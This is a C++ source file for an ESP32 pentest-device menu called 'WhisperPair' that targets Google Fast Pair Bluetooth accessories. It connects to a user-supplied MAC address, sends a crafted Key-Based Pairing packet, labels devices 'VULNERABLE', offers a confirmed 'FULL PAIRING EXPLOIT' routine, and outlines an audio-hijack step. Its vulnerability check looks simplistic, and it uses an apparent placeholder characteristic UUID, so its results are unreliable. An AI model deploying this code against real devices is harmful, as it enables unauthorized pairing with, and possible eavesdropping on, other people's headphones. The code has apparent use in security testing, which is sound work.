#include "whisperpair.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>

extern std::vector<String> fastPairDevices;

bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
    drawMainBorderWithTitle("CONFIRMATION REQUIRED");
    padprintln(message);
    padprintln("");
    padprintln("Hold SELECT for " + String(ms/1000) + "s");
    padprintln("or press ESC to cancel");
    
    uint32_t startTime = millis();
    bool holding = false;
    
    while(millis() - startTime < ms) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", 0);
            delay(1000);
            return false;
        }
        
        if(check(SelPress)) {
            holding = true;
            int progress = ((millis() - startTime) * 100) / ms;
            tft.fillRect(20, 120, tftWidth-40, 10, bruceConfig.bgColor);
            tft.fillRect(20, 120, ((tftWidth-40) * progress) / 100, 10, TFT_GREEN);
        } else {
            if(holding) {
                displayMessage("Released too soon", "", "", "", 0);
                delay(1000);
                return false;
            }
        }
        
        delay(50);
    }
    
    if(holding) {
        displayMessage("Confirmed!", "", "", "", 0);
        delay(500);
        return true;
    }
    
    return false;
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", 0);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    
    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", 0);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    displayMessage("Connected, discovering...", "", "", "", 0);
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", 0);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", 0);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;
    
    uint8_t targetBytes[6];
    const uint8_t* addr = target.getNative();
    for(int i = 0; i < 6; i++) {
        targetBytes[5-i] = addr[i];
    }
    memcpy(&packet[2], targetBytes, 6);
    
    esp_fill_random(&packet[8], 8);
    
    displayMessage("Sending test packet...", "", "", "", 0);
    
    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", 0);
        delay(100);
        
        bool vulnerable = pChar->canRead() || pChar->canNotify();
        
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        
        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", 0);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", 0);
            return false;
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

void testFastPairVulnerability() {
    String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
    if(input.isEmpty()) return;
    
    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
    
    if(!requireButtonHoldConfirmation("Test vulnerability?", 3000)) {
        return;
    }
    
    bool vulnerable = attemptKeyBasedPairing(target);
    
    Serial.printf("[WhisperPair] %s - %s\n", 
        input.c_str(), 
        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
    );
    
    delay(3000);
}

void whisperPairMenu() {
    std::vector<Option> options;
    
    options.push_back({"[?] Passive Scan", []() {
        extern bool passiveFastPairScan(uint32_t);
        passiveFastPairScan(30);
    }});
    
    options.push_back({"[-] Test Vulnerability", []() {
        testFastPairVulnerability();
    }});
    
    options.push_back({"[ECDH] Crypto Benchmark", []() {
        extern void whisperPairFullBenchmark();
        whisperPairFullBenchmark();
        padprintln("");
        padprintln("Press any key");
        while(!check(AnyKeyPress)) delay(50);
    }});
    
    options.push_back({"[$$] Full Pair Test", []() {
        if(!requireButtonHoldConfirmation("FULL PAIRING EXPLOIT", 5000)) return;
        
        String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
        if(input.isEmpty()) return;
        
        NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
        
        displayMessage("Starting full exploit...", "", "", "", 0);
        padprintln("1. Connect to device");
        padprintln("2. ECDH key exchange");
        padprintln("3. Complete pairing");
        padprintln("4. Store account key");
        
        if(!requireButtonHoldConfirmation("CONFIRM FULL EXPLOIT", 3000)) return;
        
        extern bool whisperPairFullExploit(NimBLEAddress);
        bool success = whisperPairFullExploit(target);
        
        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", 0);
            displayMessage("Device paired", "", "", "", 0);
        } else {
            displayMessage("Exploit failed", "", "", "", 0);
            displayMessage("May be patched", "", "", "", 0);
        }
        delay(3000);
    }});
    
    options.push_back({"[!!!] Audio Hijack Test", []() {
        displayMessage("NOT IMPLEMENTED", "", "", "", 0);
        displayMessage("Would require:", "", "", "", 0);
        displayMessage("1. Successful pairing", "", "", "", 0);
        displayMessage("2. A2DP profile connect", "", "", "", 0);
        displayMessage("3. Audio stream injection", "", "", "", 0);
        delay(3000);
    }});
    
    options.push_back({"Back", []() { returnToMenu = true; }});
    
    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair");
}
